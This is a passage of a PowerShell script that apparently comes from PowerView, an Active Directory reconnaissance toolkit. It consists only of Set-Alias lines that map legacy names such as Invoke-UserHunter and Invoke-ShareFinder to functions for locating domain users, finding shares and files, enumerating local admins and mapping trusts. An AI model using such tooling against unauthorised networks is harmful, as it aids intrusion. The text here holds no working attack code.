Set-Alias Invoke-ThreadedFunction New-ThreadedFunction
Set-Alias Invoke-UserHunter Find-DomainUserLocation
Set-Alias Invoke-ProcessHunter Find-DomainProcess
Set-Alias Invoke-EventHunter Find-DomainUserEvent
Set-Alias Invoke-ShareFinder Find-DomainShare
Set-Alias Invoke-FileFinder Find-InterestingDomainShareFile
Set-Alias Invoke-EnumerateLocalAdmin Find-DomainLocalGroupMember
Set-Alias Get-NetDomainTrust Get-DomainTrust
Set-Alias Get-NetForestTrust Get-ForestTrust
Set-Alias Find-ForeignUser Get-DomainForeignUser
Set-Alias Find-ForeignGroup Get-DomainForeignGroupMember
Set-Alias Invoke-MapDomainTrust Get-DomainTrustMapping
Set-Alias Get-DomainPolicy Get-DomainPolicyData
